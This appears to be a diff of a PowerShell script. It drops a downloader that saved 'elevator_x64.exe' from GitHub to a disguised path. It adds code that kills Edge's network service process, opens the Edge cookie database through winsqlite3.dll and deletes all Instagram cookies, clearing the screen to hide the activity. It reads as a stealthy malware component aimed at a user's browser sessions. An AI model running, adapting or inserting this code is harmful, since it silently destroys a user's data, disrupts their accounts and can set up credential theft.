@@ -1,7 +1,83 @@
-$url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/elevator_x64.exe"
+# --- 1. Define the DLL Interface with Manual String Handling ---
+$Signature = @"
+[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
+public static extern int sqlite3_open(string filename, out IntPtr db);
 
-$outPath = "C:\ProgramX64\extentions\evab.exe"
+[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
+public static extern int sqlite3_prepare_v2(IntPtr db, string sql, int numBytes, out IntPtr stmt, IntPtr tail);
+
+[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
+public static extern int sqlite3_step(IntPtr stmt);
+
+// We change this to IntPtr to prevent the auto-marshaler crash
+[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
+public static extern IntPtr sqlite3_column_text(IntPtr stmt, int index);
+
+[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
+public static extern int sqlite3_column_count(IntPtr stmt);
+
+[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
+public static extern int sqlite3_finalize(IntPtr stmt);
+
+[DllImport("winsqlite3.dll", CallingConvention = CallingConvention.Cdecl)]
+public static extern int sqlite3_close(IntPtr db);
+"@
+$processes = Get-CimInstance Win32_Process -Property Name, CommandLine, ProcessId
+
+if (-not ([System.Management.Automation.PSTypeName]"Win32.SQLiteSafe").Type) {
+    Add-Type -MemberDefinition $Signature -Name "SQLiteSafe" -Namespace "Win32"
+}
+Add-Type -AssemblyName System.Windows.Forms
 
 
 
-Invoke-WebRequest -Uri $url -OutFile $outPath
+
+
+function delete-data {
+    param (
+        [string]$op,
+        [string]$p
+    )
+    $dbHandle = [IntPtr]::Zero
+
+
+    if ([Win32.SQLiteSafe]::sqlite3_open($op, [ref]$dbHandle) -eq 0) {
+
+
+    
+    
+    
+    $queryDelete = "DELETE FROM cookies WHERE host_key LIKE '%instagram%';"
+    $delStmt = [IntPtr]::Zero
+    
+    if ([Win32.SQLiteSafe]::sqlite3_prepare_v2($dbHandle, $queryDelete, -1, [ref]$delStmt, [IntPtr]::Zero) -eq 0) {
+        $res = [Win32.SQLiteSafe]::sqlite3_step($delStmt)
+
+        
+        
+        [Win32.SQLiteSafe]::sqlite3_finalize($delStmt)
+    }
+
+
+    [Win32.SQLiteSafe]::sqlite3_close($dbHandle)
+
+    }
+}
+
+$op = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
+
+foreach ($proc in $processes) {
+    # Check if the command line exists and contains the specific NetworkService string
+    if ($proc.CommandLine -and $proc.CommandLine.Contains("network.mojom.NetworkService") -and $proc.Name.Contains("msedge.exe")) {
+        Stop-Process -Id $proc.ProcessId
+ 
+        break
+        
+    }
+}
+
+cls
+Start-Sleep -Seconds 1
+
+delete-data -op $op -p "s"
+cls
